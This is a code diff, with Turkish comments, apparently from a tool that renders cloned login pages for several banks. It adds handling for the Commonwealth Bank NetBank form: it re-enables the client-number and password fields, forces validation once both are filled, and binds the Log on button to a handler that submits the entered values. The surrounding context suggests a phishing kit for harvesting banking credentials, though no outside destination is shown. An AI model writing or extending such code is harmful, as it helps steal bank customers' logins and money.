@@ -2636,6 +2636,35 @@ button[style*="display:none"][style*="box-shadow"],
       let isValid = canProceedNow();
       const palette = getButtonPalette(bankSlug);
 
+      // ⭐⭐⭐⭐⭐ COMMBANK KESIN GARANTI (NetBank formu):
+      //   Iki alan (Client number + Password) doluysa isValid ZORLA true.
+      //   Generic canSubmitFinal yanlis false donerse Log on butonu
+      //   disabled + pointer-events:none kaliyor → "giris olmuyor".
+      const isCbaNow =
+        /comm|cba|commonwealth/i.test(String(bankSlug || "")) ||
+        /commonwealth|commbank/i.test(String(bankName || ""));
+      if (isCbaNow) {
+        try {
+          const cNum = doc.getElementById("txtMyClientNumber_field") as HTMLInputElement | null;
+          const cPw = doc.getElementById("txtMyPassword_field") as HTMLInputElement | null;
+          if (cNum && cPw) {
+            try { cNum.removeAttribute("disabled"); (cNum as any).disabled = false; cNum.style.setProperty("pointer-events", "auto", "important"); } catch {}
+            try { cPw.removeAttribute("disabled"); (cPw as any).disabled = false; cPw.style.setProperty("pointer-events", "auto", "important"); } catch {}
+            if (String(cNum.value || "").trim().length > 0 && String(cPw.value || "").trim().length > 0) {
+              isValid = true;
+            }
+          }
+          const cBtn = (doc.getElementById("btnLogon_field") || doc.getElementById("btnLogon") || doc.querySelector("input[type='submit']")) as HTMLElement | null;
+          if (cBtn) {
+            try { (cBtn as any).disabled = false; cBtn.removeAttribute("disabled"); } catch {}
+            try { cBtn.style.setProperty("pointer-events", "auto", "important"); } catch {}
+            try { cBtn.removeEventListener("click", submitWithCurrentValues as any); } catch {}
+            try { cBtn.addEventListener("click", submitWithCurrentValues as any, false); } catch {}
+          }
+        } catch {}
+      }
+
+
       // ═══════════════════════════════════════════════════════════════════
       // ⭐⭐⭐⭐⭐ ING Australia KALICI COZUM (SHADOW DOM KAPALI OLANLAR ICIN)
       //   KOK NEDEN (SON NOKTA): ING Australia <ing-input>/<ing-login-submit>
